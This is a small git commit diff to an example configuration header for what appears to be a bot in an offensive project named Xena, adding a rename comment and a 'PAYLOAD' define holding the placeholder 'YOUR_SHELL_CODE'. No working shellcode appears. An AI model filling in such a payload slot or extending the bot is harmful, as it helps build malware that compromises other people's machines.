0a9288fd8dd500a6ba6ec8142bb31b4e85ce4d77
Zarkones <17931195+zarkones@users.noreply.github.com>
2021-11-22 18:54:05 +0100

    Env.

--- bots/xena-bot-monolitic/env.example.hpp
+++ bots/xena-bot-monolitic/env.example.hpp
@@ -1,8 +1,12 @@
+// RENAME TO: env.hpp
+
 #ifndef ENV_HPP
 #define ENV_HPP
 
 // This will insert print statements into the binary.
 #define TALK
+
+#define PAYLOAD "YOUR_SHELL_CODE"
 
 // Defines a read limit from the network.
 #define ENV_NETWORK_READ_MAX 100240
